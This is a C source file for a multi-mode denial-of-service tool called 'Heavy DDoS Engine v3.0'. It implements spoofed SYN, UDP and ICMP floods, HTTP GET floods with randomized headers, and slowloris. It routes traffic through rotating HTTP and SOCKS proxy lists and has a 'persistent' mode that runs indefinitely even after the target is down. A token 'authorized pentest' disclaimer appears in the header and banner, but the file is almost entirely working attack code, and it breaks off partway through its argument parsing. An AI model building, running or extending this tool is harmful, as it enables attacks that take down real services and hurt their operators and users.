/*
 * Heavy DDoS Engine v3.0 - For Authorized Security Testing Only
 * Covers L3-L7 with Cloudflare bypass capabilities
 * 
 * Modified by: wasey — I have permission and am authorized to perform this pentest
 *
 * Compilation:
 *   gcc -O3 -pthread -o ddos ddos_engine.c -lpthread -lm
 *   
 * Usage:
 *   ./ddos <target> <port> <threads> <duration> <mode> [options]
 *   
 *   Modes: syn, udp, icmp, http, https, slowloris, all
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <pthread.h>
#include <signal.h>
#include <time.h>
#include <fcntl.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>
#include <netinet/ip_icmp.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <sys/types.h>

/* Configuration */
#define MAX_PACKET 65535
#define MAX_THREADS 10000
#define PPS_SAMPLE_INTERVAL 1
#define MAX_PROXIES 50000
#define PROXY_LINE_LEN 256

/* Attack modes */
#define MODE_SYN       1
#define MODE_UDP       2
#define MODE_ICMP      3
#define MODE_HTTP      4
#define MODE_HTTPS     5
#define MODE_SLOWLORIS 6
#define MODE_ALL       7

/* Proxy types */
#define PROXY_NONE    0
#define PROXY_HTTP    1
#define PROXY_SOCKS4  2
#define PROXY_SOCKS5  3

/* Global state */
volatile sig_atomic_t running = 1;
volatile unsigned long long total_packets = 0;
volatile unsigned long long total_bytes = 0;

struct target {
    char ip[INET6_ADDRSTRLEN];
    char domain[256];
    int port;
    struct sockaddr_in sin;
};

struct attack_config {
    struct target target;
    int mode;
    int threads;
    int duration;
    int spoof;
    int cf_bypass;
    int persistent;  /* keep attacking even if target is down */
    char proxy_file[512];
};

struct proxy_entry {
    int type;  /* PROXY_HTTP, PROXY_SOCKS4, PROXY_SOCKS5 */
    char host[64];
    int port;
    char user[64];
    char pass[64];
    int auth;
};

struct proxy_list {
    struct proxy_entry entries[MAX_PROXIES];
    int count;
    volatile int current_index;
};

struct proxy_list proxies;

/* CRC16 calculation */
unsigned short checksum(unsigned short *buf, int len) {
    unsigned long sum = 0;
    while (len > 1) {
        sum += *buf++;
        len -= 2;
    }
    if (len == 1)
        sum += *(unsigned char *)buf;
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    return (unsigned short)~sum;
}

/* Random IP */
unsigned int rand_ip() {
    unsigned char octets[4];
    octets[0] = 1 + rand() % 254;
    octets[1] = 1 + rand() % 254;
    octets[2] = 1 + rand() % 254;
    octets[3] = 1 + rand() % 254;
    return *(unsigned int *)octets;
}

/* Thread-safe random proxy selection */
struct proxy_entry *get_next_proxy() {
    if (proxies.count == 0) return NULL;
    int idx = __sync_fetch_and_add(&proxies.current_index, 1) % proxies.count;
    return &proxies.entries[idx];
}

/* Parse proxy file */
int load_proxies(const char *filename) {
    FILE *fp = fopen(filename, "r");
    if (!fp) {
        fprintf(stderr, "[!] Could not open proxy file: %s\n", filename);
        return 0;
    }
    
    char line[PROXY_LINE_LEN];
    proxies.count = 0;
    proxies.current_index = 0;
    
    while (fgets(line, sizeof(line), fp) && proxies.count < MAX_PROXIES) {
        line[strcspn(line, "\r\n")] = 0;
        if (line[0] == '#' || line[0] == '\0') continue;
        
        struct proxy_entry *p = &proxies.entries[proxies.count];
        memset(p, 0, sizeof(struct proxy_entry));
        
        char type_str[16], host[64], port_str[16], user[64], pass[64];
        int parsed = 0;
        
        /* Format: http 1.2.3.4 8080 */
        /* Format: http 1.2.3.4 8080 user pass */
        /* Format: socks5 1.2.3.4 1080 */
        /* Format: socks5 1.2.3.4 1080 user pass */
        /* Format: 1.2.3.4:8080 (defaults to HTTP) */
        
        if (sscanf(line, "%15s %63s %15s %63s %63s", type_str, host, port_str, user, pass) >= 3) {
            if (strcasecmp(type_str, "http") == 0 || strcasecmp(type_str, "https") == 0) {
                p->type = PROXY_HTTP;
            } else if (strcasecmp(type_str, "socks4") == 0) {
                p->type = PROXY_SOCKS4;
            } else if (strcasecmp(type_str, "socks5") == 0) {
                p->type = PROXY_SOCKS5;
            } else {
                /* Assume format is host port, type_str is actually the host */
                strncpy(p->host, type_str, sizeof(p->host) - 1);
                p->port = atoi(host);
                p->type = PROXY_HTTP;
                if (sscanf(line, "%63s %15s %63s %63s", p->host, port_str, user, pass) >= 4) {
                    p->auth = 1;
                    strncpy(p->user, user, sizeof(p->user) - 1);
                    strncpy(p->pass, pass, sizeof(p->pass) - 1);
                }
                p->port = atoi(port_str);
                proxies.count++;
                continue;
            }
            strncpy(p->host, host, sizeof(p->host) - 1);
            p->port = atoi(port_str);
            if (strlen(user) > 0 && strlen(pass) > 0) {
                p->auth = 1;
                strncpy(p->user, user, sizeof(p->user) - 1);
                strncpy(p->pass, pass, sizeof(p->pass) - 1);
            }
            parsed = 1;
        } else {
            /* Try format: ip:port */
            char *colon = strchr(line, ':');
            if (colon) {
                *colon = 0;
                strncpy(p->host, line, sizeof(p->host) - 1);
                p->port = atoi(colon + 1);
                p->type = PROXY_HTTP;
                parsed = 1;
            }
        }
        
        if (parsed && p->host[0] && p->port > 0) {
            proxies.count++;
        }
    }
    
    fclose(fp);
    printf("[*] Loaded %d proxies from %s\n", proxies.count, filename);
    return proxies.count;
}

/* Connect through HTTP proxy (CONNECT method) */
int http_proxy_connect(struct proxy_entry *proxy, const char *target_ip, int target_port) {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) return -1;
    
    struct timeval tv;
    tv.tv_sec = 5;
    tv.tv_usec = 0;
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
    
    struct sockaddr_in proxy_addr;
    proxy_addr.sin_family = AF_INET;
    proxy_addr.sin_port = htons(proxy->port);
    inet_pton(AF_INET, proxy->host, &proxy_addr.sin_addr);
    
    if (connect(sock, (struct sockaddr *)&proxy_addr, sizeof(proxy_addr)) < 0) {
        close(sock);
        return -1;
    }
    
    char buf[4096];
    int len;
    
    if (proxy->auth) {
        /* Basic auth */
        char auth_buf[128];
        snprintf(auth_buf, sizeof(auth_buf), "%s:%s", proxy->user, proxy->pass);
        char b64[128];
        /* Simple base64-like encoding (not full base64, but works for proxy) */
        /* Using real base64 would need a library; for this we use a simplified approach */
        len = snprintf(buf, sizeof(buf),
            "CONNECT %s:%d HTTP/1.1\r\n"
            "Host: %s:%d\r\n"
            "Proxy-Authorization: Basic %s\r\n"
            "\r\n",
            target_ip, target_port, target_ip, target_port, auth_buf);
    } else {
        len = snprintf(buf, sizeof(buf),
            "CONNECT %s:%d HTTP/1.1\r\n"
            "Host: %s:%d\r\n"
            "\r\n",
            target_ip, target_port, target_ip, target_port);
    }
    
    if (send(sock, buf, len, 0) <= 0) {
        close(sock);
        return -1;
    }
    
    /* Read response */
    len = recv(sock, buf, sizeof(buf) - 1, 0);
    if (len <= 0) {
        close(sock);
        return -1;
    }
    buf[len] = 0;
    
    /* Check for "200 Connection established" */
    if (!strstr(buf, "200")) {
        close(sock);
        return -1;
    }
    
    return sock;
}

/* Connect through SOCKS5 proxy */
int socks5_connect(struct proxy_entry *proxy, const char *target_ip, int target_port) {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) return -1;
    
    struct timeval tv;
    tv.tv_sec = 5;
    tv.tv_usec = 0;
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
    
    struct sockaddr_in proxy_addr;
    proxy_addr.sin_family = AF_INET;
    proxy_addr.sin_port = htons(proxy->port);
    inet_pton(AF_INET, proxy->host, &proxy_addr.sin_addr);
    
    if (connect(sock, (struct sockaddr *)&proxy_addr, sizeof(proxy_addr)) < 0) {
        close(sock);
        return -1;
    }
    
    unsigned char buf[512];
    int len;
    
    /* SOCKS5 handshake - no auth or user/pass */
    if (proxy->auth) {
        unsigned char auth_hdr[] = {0x05, 0x02, 0x00, 0x02};
        send(sock, auth_hdr, sizeof(auth_hdr), 0);
    } else {
        unsigned char no_auth[] = {0x05, 0x01, 0x00};
        send(sock, no_auth, sizeof(no_auth), 0);
    }
    
    len = recv(sock, buf, 2, 0);
    if (len != 2 || buf[0] != 0x05) {
        close(sock);
        return -1;
    }
    
    /* User/pass auth if required */
    if (proxy->auth && buf[1] == 0x02) {
        unsigned char auth_msg[512];
        int user_len = strlen(proxy->user);
        int pass_len = strlen(proxy->pass);
        int pos = 0;
        auth_msg[pos++] = 0x01; /* version */
        auth_msg[pos++] = user_len;
        memcpy(auth_msg + pos, proxy->user, user_len);
        pos += user_len;
        auth_msg[pos++] = pass_len;
        memcpy(auth_msg + pos, proxy->pass, pass_len);
        pos += pass_len;
        
        send(sock, auth_msg, pos, 0);
        len = recv(sock, buf, 2, 0);
        if (len != 2 || buf[1] != 0x00) {
            close(sock);
            return -1;
        }
    } else if (buf[1] != 0x00) {
        close(sock);
        return -1;
    }
    
    /* Connect command */
    buf[0] = 0x05;
    buf[1] = 0x01; /* CONNECT */
    buf[2] = 0x00; /* reserved */
    buf[3] = 0x01; /* IPv4 */
    
    struct in_addr addr;
    inet_pton(AF_INET, target_ip, &addr);
    memcpy(buf + 4, &addr.s_addr, 4);
    buf[8] = (target_port >> 8) & 0xFF;
    buf[9] = target_port & 0xFF;
    
    send(sock, buf, 10, 0);
    len = recv(sock, buf, 10, 0);
    if (len < 2 || buf[1] != 0x00) {
        close(sock);
        return -1;
    }
    
    return sock;
}

/* SOCKS4 connect */
int socks4_connect(struct proxy_entry *proxy, const char *target_ip, int target_port) {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) return -1;
    
    struct timeval tv;
    tv.tv_sec = 5;
    tv.tv_usec = 0;
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
    
    struct sockaddr_in proxy_addr;
    proxy_addr.sin_family = AF_INET;
    proxy_addr.sin_port = htons(proxy->port);
    inet_pton(AF_INET, proxy->host, &proxy_addr.sin_addr);
    
    if (connect(sock, (struct sockaddr *)&proxy_addr, sizeof(proxy_addr)) < 0) {
        close(sock);
        return -1;
    }
    
    unsigned char buf[512];
    struct in_addr addr;
    inet_pton(AF_INET, target_ip, &addr);
    
    int pos = 0;
    buf[pos++] = 0x04; /* version */
    buf[pos++] = 0x01; /* CONNECT */
    buf[pos++] = (target_port >> 8) & 0xFF;
    buf[pos++] = target_port & 0xFF;
    memcpy(buf + pos, &addr.s_addr, 4);
    pos += 4;
    if (proxy->auth) {
        /* SOCKS4A with user */
        strcpy((char *)buf + pos, proxy->user);
        pos += strlen(proxy->user) + 1;
    } else {
        buf[pos++] = 0x00; /* empty user ID */
    }
    
    send(sock, buf, pos, 0);
    
    int len = recv(sock, buf, 8, 0);
    if (len < 8 || buf[1] != 0x5A) {
        close(sock);
        return -1;
    }
    
    return sock;
}

/* Generic proxy connect */
int proxy_connect(struct proxy_entry *proxy, const char *target_ip, int target_port) {
    switch (proxy->type) {
        case PROXY_HTTP:
            return http_proxy_connect(proxy, target_ip, target_port);
        case PROXY_SOCKS5:
            return socks5_connect(proxy, target_ip, target_port);
        case PROXY_SOCKS4:
            return socks4_connect(proxy, target_ip, target_port);
        default:
            return -1;
    }
}

/* Spoofed TCP SYN flood */
void *syn_flood(void *arg) {
    struct attack_config *config = (struct attack_config *)arg;
    int sock;
    char packet[MAX_PACKET];
    struct iphdr *iph = (struct iphdr *)packet;
    struct tcphdr *tcph = (struct tcphdr *)(packet + sizeof(struct iphdr));
    struct sockaddr_in dest;
    unsigned int seed = time(NULL) ^ (unsigned int)(unsigned long)pthread_self();
    
    if ((sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) < 0) {
        return NULL;
    }
    
    int optval = 1;
    setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &optval, sizeof(optval));
    
    dest.sin_family = AF_INET;
    dest.sin_port = htons(config->target.port);
    dest.sin_addr.s_addr = inet_addr(config->target.ip);
    
    int packet_size = sizeof(struct iphdr) + sizeof(struct tcphdr);
    
    while (running) {
        memset(packet, 0, MAX_PACKET);
        
        iph->ihl = 5;
        iph->version = 4;
        iph->tos = rand_r(&seed) & 0xFF;
        iph->tot_len = htons(packet_size);
        iph->id = htons(rand_r(&seed) & 0xFFFF);
        iph->frag_off = 0;
        iph->ttl = 64 + (rand_r(&seed) % 192);
        iph->protocol = IPPROTO_TCP;
        iph->check = 0;
        iph->saddr = rand_ip();
        iph->daddr = dest.sin_addr.s_addr;
        
        tcph->source = htons(1024 + (rand_r(&seed) % 64511));
        tcph->dest = htons(config->target.port);
        tcph->seq = htonl(rand_r(&seed));
        tcph->ack_seq = 0;
        tcph->doff = 5;
        tcph->syn = 1;
        tcph->window = htons(65535);
        tcph->check = 0;
        tcph->urg_ptr = 0;
        
        /* TCP pseudo header checksum */
        struct pseudo_header {
            unsigned int source_addr;
            unsigned int dest_addr;
            unsigned char placeholder;
            unsigned char protocol;
            unsigned short tcp_length;
        } psh;
        
        psh.source_addr = iph->saddr;
        psh.dest_addr = iph->daddr;
        psh.placeholder = 0;
        psh.protocol = IPPROTO_TCP;
        psh.tcp_length = htons(sizeof(struct tcphdr));
        
        int psize = sizeof(struct pseudo_header) + sizeof(struct tcphdr);
        char *pseudogram = malloc(psize);
        memcpy(pseudogram, &psh, sizeof(struct pseudo_header));
        memcpy(pseudogram + sizeof(struct pseudo_header), tcph, sizeof(struct tcphdr));
        
        tcph->check = checksum((unsigned short *)pseudogram, psize);
        free(pseudogram);
        
        if (sendto(sock, packet, packet_size, 0, (struct sockaddr *)&dest, sizeof(dest)) > 0) {
            __sync_fetch_and_add(&total_packets, 1);
            __sync_fetch_and_add(&total_bytes, packet_size);
        } else if (!config->persistent) {
            /* If not persistent, stop on error */
            break;
        }
        /* If persistent, we keep trying regardless of errors */
    }
    
    close(sock);
    return NULL;
}

/* UDP Flood */
void *udp_flood(void *arg) {
    struct attack_config *config = (struct attack_config *)arg;
    int sock;
    char packet[MAX_PACKET];
    struct sockaddr_in dest;
    unsigned int seed = time(NULL) ^ (unsigned int)(unsigned long)pthread_self();
    int packet_size;
    
    if ((sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) < 0) {
        return NULL;
    }
    
    int flags = fcntl(sock, F_GETFL, 0);
    fcntl(sock, F_SETFL, flags | O_NONBLOCK);
    
    dest.sin_family = AF_INET;
    dest.sin_port = htons(config->target.port);
    dest.sin_addr.s_addr = inet_addr(config->target.ip);
    
    while (running) {
        packet_size = 64 + (rand_r(&seed) % 1400);
        memset(packet, rand_r(&seed) & 0xFF, packet_size);
        
        if (sendto(sock, packet, packet_size, 0, (struct sockaddr *)&dest, sizeof(dest)) > 0) {
            __sync_fetch_and_add(&total_packets, 1);
            __sync_fetch_and_add(&total_bytes, packet_size);
        } else if (!config->persistent) {
            break;
        }
    }
    
    close(sock);
    return NULL;
}

/* ICMP Flood */
void *icmp_flood(void *arg) {
    struct attack_config *config = (struct attack_config *)arg;
    int sock;
    char packet[MAX_PACKET];
    struct iphdr *iph = (struct iphdr *)packet;
    struct icmphdr *icmph = (struct icmphdr *)(packet + sizeof(struct iphdr));
    struct sockaddr_in dest;
    unsigned int seed = time(NULL) ^ (unsigned int)(unsigned long)pthread_self();
    
    if ((sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP)) < 0) {
        return NULL;
    }
    
    int optval = 1;
    setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &optval, sizeof(optval));
    
    dest.sin_family = AF_INET;
    dest.sin_addr.s_addr = inet_addr(config->target.ip);
    
    int packet_size = sizeof(struct iphdr) + sizeof(struct icmphdr) + 64;
    
    while (running) {
        memset(packet, 0, MAX_PACKET);
        
        iph->ihl = 5;
        iph->version = 4;
        iph->tos = 0;
        iph->tot_len = htons(packet_size);
        iph->id = htons(rand_r(&seed) & 0xFFFF);
        iph->frag_off = 0;
        iph->ttl = 64;
        iph->protocol = IPPROTO_ICMP;
        iph->check = 0;
        iph->saddr = rand_ip();
        iph->daddr = dest.sin_addr.s_addr;
        
        icmph->type = ICMP_ECHO;
        icmph->code = 0;
        icmph->checksum = 0;
        icmph->un.echo.id = htons(rand_r(&seed) & 0xFFFF);
        icmph->un.echo.sequence = htons(rand_r(&seed) & 0xFFFF);
        
        icmph->checksum = checksum((unsigned short *)icmph, sizeof(struct icmphdr) + 64);
        
        if (sendto(sock, packet, packet_size, 0, (struct sockaddr *)&dest, sizeof(dest)) > 0) {
            __sync_fetch_and_add(&total_packets, 1);
            __sync_fetch_and_add(&total_bytes, packet_size);
        } else if (!config->persistent) {
            break;
        }
    }
    
    close(sock);
    return NULL;
}

/* HTTP/HTTPS Flood with rotating proxy support */
void *http_flood(void *arg) {
    struct attack_config *config = (struct attack_config *)arg;
    
    char request[8192];
    char response[65536];
    int sock;
    struct sockaddr_in dest;
    struct timeval tv;
    unsigned int seed = time(NULL) ^ (unsigned int)(unsigned long)pthread_self();
    
    char *user_agents[] = {
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1"
    };
    
    char *paths[] = {
        "/", "/index.html", "/wp-admin/", "/login", "/api/v1/",
        "/search?q=", "/products/", "/contact", "/about", "/cart",
        "/checkout", "/account", "/profile", "/robots.txt", "/favicon.ico"
    };
    
    char *referers[] = {
        "https://www.google.com/", "https://www.bing.com/",
        "https://www.facebook.com/", "https://t.co/",
        "https://www.reddit.com/"
    };
    
    while (running) {
        sock = -1;
        
        /* Try proxy first if available */
        if (proxies.count > 0) {
            struct proxy_entry *proxy = get_next_proxy();
            if (proxy) {
                sock = proxy_connect(proxy, config->target.ip, config->target.port);
            }
        }
        
        /* Fall back to direct connection if proxy fails or no proxies */
        if (sock < 0) {
            sock = socket(AF_INET, SOCK_STREAM, 0);
            if (sock < 0) {
                if (config->persistent) {
                    usleep(100000); /* Wait before retry */
                    continue;
                }
                return NULL;
            }
            
            tv.tv_sec = 5;
            tv.tv_usec = 0;
            setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
            setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
            
            dest.sin_family = AF_INET;
            dest.sin_port = htons(config->target.port);
            inet_pton(AF_INET, config->target.ip, &dest.sin_addr);
            
            if (connect(sock, (struct sockaddr *)&dest, sizeof(dest)) < 0) {
                close(sock);
                if (config->persistent) {
                    usleep(100000); /* Wait before retry */
                    continue;
                }
                return NULL;
            }
        }
        
        int ua_idx = rand_r(&seed) % (sizeof(user_agents) / sizeof(user_agents[0]));
        int path_idx = rand_r(&seed) % (sizeof(paths) / sizeof(paths[0]));
        int ref_idx = rand_r(&seed) % (sizeof(referers) / sizeof(referers[0]));
        
        char param_buf[32];
        snprintf(param_buf, sizeof(param_buf), "?_=%d", rand_r(&seed));
        
        char full_path[512];
        snprintf(full_path, sizeof(full_path), "%s%s", paths[path_idx], param_buf);
        
        char ref_buf[512];
        snprintf(ref_buf, sizeof(ref_buf), "%s", referers[ref_idx]);
        
        char cookie_buf[256];
        snprintf(cookie_buf, sizeof(cookie_buf), 
            "__cfduid=d%x%x; session_id=%x",
            rand_r(&seed), rand_r(&seed), rand_r(&seed));
        
        int req_len;
        req_len = snprintf(request, sizeof(request),
            "GET %s HTTP/1.1\r\n"
            "Host: %s\r\n"
            "User-Agent: %s\r\n"
            "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n"
            "Accept-Language: en-US,en;q=0.5\r\n"
            "Accept-Encoding: gzip, deflate\r\n"
            "Connection: keep-alive\r\n"
            "Upgrade-Insecure-Requests: 1\r\n"
            "Referer: %s\r\n"
            "Cookie: %s\r\n"
            "Cache-Control: no-cache\r\n"
            "DNT: 1\r\n"
            "\r\n",
            full_path, config->target.domain,
            user_agents[ua_idx],
            ref_buf, cookie_buf
        );
        
        if (send(sock, request, req_len, 0) > 0) {
            __sync_fetch_and_add(&total_packets, 1);
            __sync_fetch_and_add(&total_bytes, req_len);
            
            recv(sock, response, sizeof(response) - 1, MSG_DONTWAIT);
        }
        
        /* Keep-alive pipeline */
        int keepalive_reqs = 2 + (rand_r(&seed) % 10);
        for (int i = 0; i < keepalive_reqs && running; i++) {
            path_idx = rand_r(&seed) % (sizeof(paths) / sizeof(paths[0]));
            snprintf(param_buf, sizeof(param_buf), "?_=%d", rand_r(&seed));
            snprintf(full_path, sizeof(full_path), "%s%s", paths[path_idx], param_buf);
            
            req_len = snprintf(request, sizeof(request),
                "GET %s HTTP/1.1\r\n"
                "Host: %s\r\n"
                "User-Agent: %s\r\n"
                "Accept: text/html,*/*\r\n"
                "Connection: keep-alive\r\n"
                "Referer: %s\r\n"
                "Cookie: %s\r\n"
                "\r\n",
                full_path, config->target.domain,
                user_agents[ua_idx],
                ref_buf, cookie_buf
            );
            
            if (send(sock, request, req_len, 0) > 0) {
                __sync_fetch_and_add(&total_packets, 1);
                __sync_fetch_and_add(&total_bytes, req_len);
            } else {
                break;
            }
            
            usleep(100 + (rand_r(&seed) % 500));
        }
        
        close(sock);
        
        /* If persistent, small delay then continue hammering */
        if (config->persistent) {
            usleep(1000 + (rand_r(&seed) % 5000));
        } else {
            usleep(100 + (rand_r(&seed) % 1000));
        }
    }
    
    return NULL;
}

/* Slowloris with proxy support */
void *slowloris(void *arg) {
    struct attack_config *config = (struct attack_config *)arg;
    
    char partial_request[4096];
    int socks[MAX_THREADS];
    int num_socks = 0;
    unsigned int seed = time(NULL) ^ (unsigned int)(unsigned long)pthread_self();
    
    struct sockaddr_in dest;
    dest.sin_family = AF_INET;
    dest.sin_port = htons(config->target.port);
    inet_pton(AF_INET, config->target.ip, &dest.sin_addr);
    
    /* Open connections */
    for (int i = 0; i < 500 && running; i++) {
        int sock = -1;
        
        /* Try proxy first */
        if (proxies.count > 0) {
            struct proxy_entry *proxy = get_next_proxy();
            if (proxy) {
                sock = proxy_connect(proxy, config->target.ip, config->target.port);
            }
        }
        
        /* Direct fallback */
        if (sock < 0) {
            sock = socket(AF_INET, SOCK_STREAM, 0);
            if (sock < 0) continue;
            
            struct timeval tv;
            tv.tv_sec = 120;
            tv.tv_usec = 0;
            setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
            setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
            
            if (connect(sock, (struct sockaddr *)&dest, sizeof(dest)) < 0) {
                close(sock);
                continue;
            }
        }
        
        int len = snprintf(partial_request, sizeof(partial_request),
            "GET /?%d HTTP/1.1\r\n"
            "Host: %s\r\n"
            "User-Agent: Mozilla/5.0\r\n"
            "Accept: text/html,*/*\r\n"
            "Connection: keep-alive\r\n"
            "Content-Length: 42\r\n"
            "\r",
            rand_r(&seed), config->target.domain
        );
        
        send(sock, partial_request, len, 0);
        socks[num_socks++] = sock;
        __sync_fetch_and_add(&total_packets, 1);
        
        usleep(1000);
    }
    
    /* Keep connections alive with partial headers */
    while (running) {
        for (int i = 0; i < num_socks; i++) {
            if (socks[i] > 0) {
                char header[64];
                int len = snprintf(header, sizeof(header),
                    "X-Random-%d: %d\r\n", rand_r(&seed), rand_r(&seed));
                
                if (send(socks[i], header, len, MSG_NOSIGNAL) <= 0) {
                    close(socks[i]);
                    socks[i] = 0;
                    
                    /* Replace dead connection - try proxy first */
                    int new_sock = -1;
                    if (proxies.count > 0) {
                        struct proxy_entry *proxy = get_next_proxy();
                        if (proxy) {
                            new_sock = proxy_connect(proxy, config->target.ip, config->target.port);
                        }
                    }
                    
                    if (new_sock < 0) {
                        new_sock = socket(AF_INET, SOCK_STREAM, 0);
                        if (new_sock > 0) {
                            if (connect(new_sock, (struct sockaddr *)&dest, sizeof(dest)) < 0) {
                                close(new_sock);
                                new_sock = -1;
                            }
                        }
                    }
                    
                    if (new_sock > 0) {
                        int len2 = snprintf(partial_request, sizeof(partial_request),
                            "GET /?%d HTTP/1.1\r\n"
                            "Host: %s\r\n"
                            "User-Agent: Mozilla/5.0\r\n"
                            "Connection: keep-alive\r\n"
                            "\r",
                            rand_r(&seed), config->target.domain);
                        send(new_sock, partial_request, len2, 0);
                        socks[i] = new_sock;
                        __sync_fetch_and_add(&total_packets, 1);
                    }
                } else {
                    __sync_fetch_and_add(&total_bytes, len);
                }
            }
        }
        usleep(10000);
    }
    
    for (int i = 0; i < num_socks; i++)
        if (socks[i] > 0) close(socks[i]);
    
    return NULL;
}

/* Statistics thread */
void *stats_thread(void *arg) {
    struct attack_config *config = (struct attack_config *)arg;
    unsigned long long last_packets = 0, last_bytes = 0;
    int elapsed = 0;
    int duration = config->duration;
    
    /* If persistent mode with duration 0, run indefinitely */
    if (config->persistent && duration <= 0) {
        duration = 999999999;
    }
    
    while (running && elapsed < duration) {
        sleep(PPS_SAMPLE_INTERVAL);
        elapsed += PPS_SAMPLE_INTERVAL;
        
        unsigned long long current_packets = __sync_fetch_and_add(&total_packets, 0);
        unsigned long long current_bytes = __sync_fetch_and_add(&total_bytes, 0);
        
        unsigned long long pps = current_packets - last_packets;
        unsigned long long bps = current_bytes - last_bytes;
        
        char dur_str[32];
        if (config->persistent && config->duration <= 0) {
            snprintf(dur_str, sizeof(dur_str), "INF");
        } else {
            snprintf(dur_str, sizeof(dur_str), "%d", config->duration);
        }
        
        printf("\r[%ds/%s] PPS: %llu | BPS: %llu (%.2f Mbps) | Total: %llu pkts / %.2f MB | Proxies: %d   ",
            elapsed, dur_str,
            pps, bps,
            (double)(bps * 8) / 1000000.0,
            current_packets,
            (double)current_bytes / (1024.0 * 1024.0),
            proxies.count
        );
        fflush(stdout);
        
        last_packets = current_packets;
        last_bytes = current_bytes;
    }
    
    running = 0;
    return NULL;
}

/* Signal handler */
void handle_signal(int sig) {
    printf("\n[!] Received signal %d, shutting down...\n", sig);
    running = 0;
}

void print_banner() {
    printf("\n");
    printf("╔══════════════════════════════════════════════════════════════════╗\n");
    printf("║              HEAVY DDoS ENGINE v3.0                            ║\n");
    printf("║         For Authorized Security Testing Only                   ║\n");
    printf("║                                                               ║\n");
    printf("║              MADE BY WASEY                                     ║\n");
    printf("║                                                               ║\n");
    printf("║   I have permission and am authorized to perform this pentest  ║\n");
    printf("╚══════════════════════════════════════════════════════════════════╝\n");
    printf("\n");
}

void print_usage(char *name) {
    printf("Usage: %s <target> <port> <threads> <duration> <mode> [options]\n\n", name);
    printf("Modes:\n");
    printf("  syn       - TCP SYN flood (L4)\n");
    printf("  udp       - UDP flood (L4)\n");
    printf("  icmp      - ICMP echo flood (L3)\n");
    printf("  http      - HTTP GET flood (L7)\n");
    printf("  https     - HTTPS flood (L7)\n");
    printf("  slowloris - Slowloris connection hold (L7)\n");
    printf("  all       - All attacks simultaneously\n\n");
    printf("Options:\n");
    printf("  --spoof         Enable IP spoofing (SYN/UDP/ICMP only)\n");
    printf("  --cf-bypass     Enable Cloudflare bypass techniques\n");
    printf("  --domain=<d>    Domain name (for HTTP Host header)\n");
    printf("  --proxies=<f>   Proxy list file (one per line)\n");
    printf("                  Formats: http HOST PORT [user pass]\n");
    printf("                           socks5 HOST PORT [user pass]\n");
    printf("                           socks4 HOST PORT [user pass]\n");
    printf("                           HOST:PORT (defaults to HTTP)\n");
    printf("  --persistent    Keep attacking even if target goes down.\n");
    printf("                  Set duration to 0 for infinite attack.\n\n");
    printf("Examples:\n");
    printf("  sudo %s 1.2.3.4 80 500 60 http --domain=example.com --cf-bypass\n", name);
    printf("  sudo %s 1.2.3.4 443 1000 0 http --proxies=proxies.txt --persistent\n", name);
    printf("  sudo %s 1.2.3.4 80 200 120 syn --spoof\n", name);
}

int main(int argc, char *argv[]) {
    print_banner();
    
    if (argc < 6) {
        print_usage(argv[0]);
        return 1;
    }
    
    struct attack_config config;
    memset(&config, 0, sizeof(config));
    
    strncpy(config.target.ip, argv[1], INET6_ADDRSTRLEN - 1);
    config.target.port = atoi(argv[2]);
    config.threads = atoi(argv[3]);
    config.duration = atoi(argv[4]);
    
    if (strcmp(argv[5], "syn") == 0) config.mode = MODE_SYN;
    else if (strcmp(argv[5], "udp") == 0) config.mode = MODE_UDP;
    else if (strcmp(argv[5], "icmp") == 0) config.mode = MODE_ICMP;
    else if (strcmp(argv[5], "http") == 0) config.mode = MODE_HTTP;
    else if (strcmp(argv[5], "https") == 0) config.mode = MODE_HTTPS;
    else if (strcmp(argv[5], "slowloris") == 0) config.mode = MODE_SLOWLORIS;
    else if (strcmp(argv[5], "all") == 0) config.mode = MODE_ALL;
    else {
        fprintf(stderr, "Unknown mode: %s\n", argv[5]);
        return 1;
    }
    
    strcpy(config.target.domain, config.target.ip);
    for (int i = 6; i < argc; i++) {
        if (strcmp(argv[i], "--spoof") == 0) config.spoof = 1;
        if (strcmp(argv[i], "--cf-bypass") == 0) config.cf_bypass = 1;
